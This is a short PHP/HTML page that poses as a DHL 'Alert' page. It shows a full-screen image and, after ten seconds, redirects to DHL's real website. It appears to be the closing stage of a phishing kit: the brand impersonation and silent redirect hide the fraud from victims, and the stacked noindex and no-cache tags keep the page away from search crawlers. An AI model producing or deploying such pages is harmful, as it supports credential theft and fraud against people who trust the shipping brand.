<?php

$domain = "http://www.dhl.com/en.html";

?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>DHL | Alert</title>
<meta http-equiv='content-type' content="text/html; charset=ISO-8859-5">
<meta http-equiv='content-type' content="text/html; charset=UTF-8">
<meta http-equiv="refresh" content="10;url=<?php echo $domain; ?>" />
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/ico" sizes="16*16" href="images/favicon.ico">

<script type="text/javascript">


function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:654px; z-index:0">
<img src="images/5.png" alt="" title="" width="1366" border="0" height="654">
</div>
</body>
</html>